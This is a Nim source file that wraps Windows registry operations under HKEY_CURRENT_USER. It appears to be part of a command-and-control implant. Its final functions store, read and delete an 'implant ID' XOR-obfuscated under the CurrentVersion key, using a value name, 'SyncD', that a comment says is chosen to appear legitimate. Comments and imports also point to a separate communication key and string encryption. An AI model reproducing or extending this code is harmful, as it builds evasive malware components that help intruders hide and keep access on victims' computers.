#[
    Module for Windows registry manipulation
    Provides functions to create, read, update, and delete keys and values
    from the registry in HKEY_CURRENT_USER.
]#
import strenc
import winim/lean
import strutils
import crypto # Import the crypto module to use xorString

type
  RegistryValueKind* = enum
    ## Supported data types in the registry
    regString,    # REG_SZ
    regExpandSz,  # REG_EXPAND_SZ
    regBinary,    # REG_BINARY
    regDword,     # REG_DWORD
    regQword,     # REG_QWORD
    regMultiSz    # REG_MULTI_SZ

# Constant to obfuscate the ID in the registry
# We use a different key than the one used for communication

proc keyExists*(path: string): bool =
  ## Checks if a key exists in HKEY_CURRENT_USER
  ## 
  ## Parameters:
  ##   path: Path of the key to check (excluding HKEY_CURRENT_USER)
  ##
  ## Returns:
  ##   true if the key exists, false otherwise
  var hKey: HKEY
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER, 
    path, 
    0, 
    KEY_READ, 
    addr hKey
  )
  
  if result == ERROR_SUCCESS:
    RegCloseKey(hKey)
    return true
  return false

proc createKey*(path: string): bool =
  ## Creates a new key in HKEY_CURRENT_USER
  ## 
  ## Parameters:
  ##   path: Path of the key to create (excluding HKEY_CURRENT_USER)
  ##
  ## Returns:
  ##   true if the key was created successfully, false otherwise
  var 
    hKey: HKEY
    disposition: DWORD
  
  let result = RegCreateKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    nil,
    REG_OPTION_NON_VOLATILE,
    KEY_WRITE,
    nil,
    addr hKey,
    addr disposition
  )
  
  if result == ERROR_SUCCESS:
    RegCloseKey(hKey)
    return true
  return false

proc setValue*(path, name: string, value: string, kind: RegistryValueKind = regString): bool =
  ## Sets a string type value in the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value
  ##   value: Data to set
  ##   kind: Data type (default regString)
  ##
  ## Returns:
  ##   true if the value was set successfully, false otherwise
  var hKey: HKEY
  var regType: DWORD
  
  case kind
  of regString: regType = REG_SZ
  of regExpandSz: regType = REG_EXPAND_SZ
  of regMultiSz: regType = REG_MULTI_SZ
  else: return false # Invalid type for strings
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_WRITE,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return false
  
  let setResult = RegSetValueEx(
    hKey,
    name,
    0,
    regType,
    cast[LPBYTE](cstring(value)),
    DWORD((value.len + 1) * sizeof(char))
  )
  
  RegCloseKey(hKey)
  return setResult == ERROR_SUCCESS

proc setDwordValue*(path, name: string, value: DWORD): bool =
  ## Sets a DWORD type value in the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value
  ##   value: DWORD value to set
  ##
  ## Returns:
  ##   true if the value was set successfully, false otherwise
  var hKey: HKEY
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_WRITE,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return false
  
  let setResult = RegSetValueEx(
    hKey,
    name,
    0,
    REG_DWORD,
    cast[LPBYTE](unsafeAddr value),
    DWORD(sizeof(DWORD))
  )
  
  RegCloseKey(hKey)
  return setResult == ERROR_SUCCESS

proc setQwordValue*(path, name: string, value: uint64): bool =
  ## Sets a QWORD type value in the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value
  ##   value: QWORD value to set
  ##
  ## Returns:
  ##   true if the value was set successfully, false otherwise
  var hKey: HKEY
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_WRITE,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return false
  
  let setResult = RegSetValueEx(
    hKey,
    name,
    0,
    REG_QWORD,
    cast[LPBYTE](unsafeAddr value),
    DWORD(sizeof(uint64))
  )
  
  RegCloseKey(hKey)
  return setResult == ERROR_SUCCESS

proc setBinaryValue*(path, name: string, data: openArray[byte]): bool =
  ## Sets a binary type value in the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value
  ##   data: Binary data to set
  ##
  ## Returns:
  ##   true if the value was set successfully, false otherwise
  var hKey: HKEY
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_WRITE,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return false
  
  let setResult = RegSetValueEx(
    hKey,
    name,
    0,
    REG_BINARY,
    unsafeAddr data[0],
    DWORD(data.len)
  )
  
  RegCloseKey(hKey)
  return setResult == ERROR_SUCCESS

proc getStringValue*(path, name: string, defaultValue: string = ""): string =
  ## Gets a string type value from the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value
  ##   defaultValue: Default value if not found
  ##
  ## Returns:
  ##   The string value from the registry or defaultValue if it does not exist
  var 
    hKey: HKEY
    dwType: DWORD
    dwSize: DWORD
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_READ,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return defaultValue
  
  # First, get the required size
  let queryResult = RegQueryValueEx(
    hKey,
    name,
    nil,
    addr dwType,
    nil,
    addr dwSize
  )
  
  if queryResult != ERROR_SUCCESS or (dwType != REG_SZ and dwType != REG_EXPAND_SZ):
    RegCloseKey(hKey)
    return defaultValue
  
  # Allocate buffer and read the value
  var buffer = newString(dwSize div sizeof(char))
  
  let getResult = RegQueryValueEx(
    hKey,
    name,
    nil,
    addr dwType,
    cast[LPBYTE](buffer[0].addr),
    addr dwSize
  )
  
  RegCloseKey(hKey)
  
  if getResult == ERROR_SUCCESS:
    # Remove the null at the end if it exists
    if buffer.len > 0 and buffer[^1] == '\0':
      buffer.setLen(buffer.len - 1)
    return buffer
  
  return defaultValue

proc getDwordValue*(path, name: string, defaultValue: DWORD = 0): DWORD =
  ## Gets a DWORD type value from the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value
  ##   defaultValue: Default value if not found
  ##
  ## Returns:
  ##   The DWORD value from the registry or defaultValue if it does not exist
  var 
    hKey: HKEY
    dwType: DWORD
    dwSize: DWORD = DWORD(sizeof(DWORD))
    value: DWORD = defaultValue
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_READ,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return defaultValue
  
  let getResult = RegQueryValueEx(
    hKey,
    name,
    nil,
    addr dwType,
    cast[LPBYTE](addr value),
    addr dwSize
  )
  
  RegCloseKey(hKey)
  
  if getResult == ERROR_SUCCESS and dwType == REG_DWORD:
    return value
  
  return defaultValue

proc getQwordValue*(path, name: string, defaultValue: uint64 = 0): uint64 =
  ## Gets a QWORD type value from the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value
  ##   defaultValue: Default value if not found
  ##
  ## Returns:
  ##   The QWORD value from the registry or defaultValue if it does not exist
  var 
    hKey: HKEY
    dwType: DWORD
    dwSize: DWORD = DWORD(sizeof(uint64))
    value: uint64 = defaultValue
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_READ,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return defaultValue
  
  let getResult = RegQueryValueEx(
    hKey,
    name,
    nil,
    addr dwType,
    cast[LPBYTE](addr value),
    addr dwSize
  )
  
  RegCloseKey(hKey)
  
  if getResult == ERROR_SUCCESS and dwType == REG_QWORD:
    return value
  
  return defaultValue

proc getBinaryValue*(path, name: string): seq[byte] =
  ## Gets a binary value from the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value
  ##
  ## Returns:
  ##   Sequence of bytes with the binary data or an empty sequence if it does not exist
  var 
    hKey: HKEY
    dwType: DWORD
    dwSize: DWORD
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_READ,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return @[]
  
  # First, get the required size
  let queryResult = RegQueryValueEx(
    hKey,
    name,
    nil,
    addr dwType,
    nil,
    addr dwSize
  )
  
  if queryResult != ERROR_SUCCESS or dwType != REG_BINARY:
    RegCloseKey(hKey)
    return @[]
  
  # Allocate buffer and read the value
  var buffer = newSeq[byte](int(dwSize))  # Use int(dwSize) instead of DWORD(dwSize)
  
  let getResult = RegQueryValueEx(
    hKey,
    name,
    nil,
    addr dwType,
    cast[LPBYTE](addr buffer[0]),
    addr dwSize
  )
  
  RegCloseKey(hKey)
  
  if getResult == ERROR_SUCCESS:
    return buffer
  
  return @[]

proc deleteValue*(path, name: string): bool =
  ## Deletes a specific value from the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value to delete
  ##
  ## Returns:
  ##   true if the value was deleted successfully, false otherwise
  var hKey: HKEY
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_WRITE,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return false
  
  let deleteResult = RegDeleteValue(
    hKey,
    name
  )
  
  RegCloseKey(hKey)
  return deleteResult == ERROR_SUCCESS

proc deleteKey*(path: string): bool =
  ## Deletes a key from the registry and all its values
  ## 
  ## Parameters:
  ##   path: Path of the key to delete (excluding HKEY_CURRENT_USER)
  ##
  ## Returns:
  ##   true if the key was deleted successfully, false otherwise
  ##
  ## Note: This function only deletes empty keys. To delete keys with subkeys,
  ## use deleteKeyRecursive
  
  # RegDeleteKey only works in Windows XP for empty keys
  let result = RegDeleteKey(
    HKEY_CURRENT_USER,
    path
  )
  
  return result == ERROR_SUCCESS

proc deleteKeyRecursive*(path: string): bool =
  ## Deletes a key from the registry and all its subkeys recursively
  ## 
  ## Parameters:
  ##   path: Path of the key to delete (excluding HKEY_CURRENT_USER)
  ##
  ## Returns:
  ##   true if the key and all its subkeys were deleted successfully, false otherwise
  var hKey: HKEY
  
  # Open the parent key
  var lastBackslash = path.rfind('\\')
  if lastBackslash == -1:
    # The key is at the top level of HKCU
    let result = RegDeleteTree(
      HKEY_CURRENT_USER,
      path
    )
    return result == ERROR_SUCCESS
  
  let parentPath = path[0 ..< lastBackslash]
  let keyName = path[lastBackslash + 1 .. ^1]
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    parentPath,
    0,
    KEY_WRITE,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return false
  
  # Use RegDeleteTree to delete the entire key and its subkeys
  let deleteResult = RegDeleteTree(
    hKey,
    keyName
  )
  
  RegCloseKey(hKey)
  return deleteResult == ERROR_SUCCESS

proc valueExists*(path, name: string): bool =
  ## Checks if a specific value exists in the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value to check
  ##
  ## Returns:
  ##   true if the value exists, false otherwise
  var 
    hKey: HKEY
    dwType: DWORD
    dwSize: DWORD
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_READ,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return false
  
  let queryResult = RegQueryValueEx(
    hKey,
    name,
    nil,
    addr dwType,
    nil,
    addr dwSize
  )
  
  RegCloseKey(hKey)
  return queryResult == ERROR_SUCCESS

proc getValueType*(path, name: string): RegistryValueKind =
  ## Gets the type of a value from the registry
  ## 
  ## Parameters:
  ##   path: Path of the key (excluding HKEY_CURRENT_USER)
  ##   name: Name of the value
  ##
  ## Returns:
  ##   The type of the value or regBinary if it does not exist
  var 
    hKey: HKEY
    dwType: DWORD
    dwSize: DWORD
  
  let result = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    path,
    0,
    KEY_READ,
    addr hKey
  )
  
  if result != ERROR_SUCCESS:
    return regBinary
  
  let queryResult = RegQueryValueEx(
    hKey,
    name,
    nil,
    addr dwType,
    nil,
    addr dwSize
  )
  
  RegCloseKey(hKey)
  
  if queryResult != ERROR_SUCCESS:
    return regBinary
  
  case dwType
  of REG_SZ: return regString
  of REG_EXPAND_SZ: return regExpandSz
  of REG_BINARY: return regBinary
  of REG_DWORD: return regDword
  of REG_QWORD: return regQword
  of REG_MULTI_SZ: return regMultiSz
  else: return regBinary

const xor_key {.intdefine.}: int = 459457925 # Stores the implant ID in the registry, applying XOR to obfuscate it
proc storeImplantID*(implantID: string): bool =
  const regPath = "Software\\Microsoft\\Windows\\CurrentVersion"
  const regValueName = "SyncD"  # Name that appears legitimate
  
  # Apply XOR to the ID before saving it
  let xoredID = xorString(implantID, xor_key)
  
  # Convert the XORed string to a sequence of bytes
  var binaryData = newSeq[byte](xoredID.len)
  for i in 0..<xoredID.len:
    binaryData[i] = byte(xoredID[i])
  
  # For debugging
  when defined verbose:
    echo "DEBUG: Saving ID in the registry as binary value"
    # Convert to hex for safe visualization
    var hexOutput = ""
    for b in binaryData:
      hexOutput.add(toHex(int(b), 2))
    echo "DEBUG: Binary data: " & hexOutput
  
  # Save as binary value
  return setBinaryValue(regPath, regValueName, binaryData)

# Retrieves the implant ID from the registry, applying XOR to deobfuscate it
proc getImplantIDFromRegistry*(): string =
  const regPath = "Software\\Microsoft\\Windows\\CurrentVersion"
  const regValueName = "SyncD"
  
  # Check if the value exists in the registry
  if not valueExists(regPath, regValueName):
    when defined verbose:
      echo "DEBUG: ID not found in the registry"
    return ""
  
  # Get the binary data
  let binaryData = getBinaryValue(regPath, regValueName)
  
  if binaryData.len == 0:
    when defined verbose:
      echo "DEBUG: Empty binary data in the registry"
    return ""
  
  # Convert the binary data to a string
  var xoredID = newString(binaryData.len)
  for i in 0..<binaryData.len:
    xoredID[i] = char(binaryData[i])
  
  # Apply XOR to deobfuscate
  let implantID = xorString(xoredID, xor_key)
  
  when defined verbose:
    echo "DEBUG: ID retrieved from binary registry: " & implantID
  
  return implantID

# Removes the implant ID from the registry
proc removeImplantIDFromRegistry*(): bool =
  const regPath = "Software\\Microsoft\\Windows\\CurrentVersion"
  const regValueName = "SyncD"
  
  # Check if the value exists in the registry
  if not valueExists(regPath, regValueName):
    when defined verbose:
      echo "DEBUG: ID not found in the registry, nothing to remove"
    return true  # Already doesn't exist, so operation is successful
  
  # Delete the value
  let result = deleteValue(regPath, regValueName)
  
  when defined verbose:
    if result:
      echo "DEBUG: Successfully removed ID from registry"
    else:
      echo "DEBUG: Failed to remove ID from registry"
  
  return result